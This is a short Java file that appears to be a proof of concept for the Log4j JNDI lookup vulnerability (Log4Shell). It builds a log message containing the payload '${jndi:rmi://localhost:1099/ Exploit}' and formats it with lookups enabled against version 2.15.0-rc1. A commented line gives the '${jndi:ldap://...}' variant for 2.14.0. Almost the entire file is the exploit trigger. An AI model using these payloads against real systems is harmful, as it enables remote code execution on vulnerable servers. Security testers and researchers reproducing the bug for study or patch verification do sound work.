
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.config.Configuration;
import org.apache.logging.log4j.core.config.builder.impl.DefaultConfigurationBuilder;
import org.apache.logging.log4j.core.impl.Log4jLogEvent;
import org.apache.logging.log4j.core.pattern.MessagePatternConverter;
import org.apache.logging.log4j.message.Message;
import org.apache.logging.log4j.message.ParameterizedMessage;
import org.junit.Test;

public class log4j {
    private static final Logger logger = LogManager.getLogger(log4j.class);

    public static void main(String[] args) {
        // log4j-2.15.0-rc1
        final Configuration config = new DefaultConfigurationBuilder().build(true);
        final MessagePatternConverter converter =
                MessagePatternConverter.newInstance(config, new String[] {"lookups"});
        final Message msg = new ParameterizedMessage("${jndi:rmi://localhost:1099/ Exploit}");
        final LogEvent event = Log4jLogEvent.newBuilder()
                .setLoggerName("MyLogger")
                .setLevel(Level.DEBUG)
                .setMessage(msg).build();
        final StringBuilder sb = new StringBuilder();
        converter.format(event, sb);
        System.out.println(sb);
        // log4j-2.14.0
        // logger.error("${jndi:ldap://localhost:1099/Exploit}");
    }

}
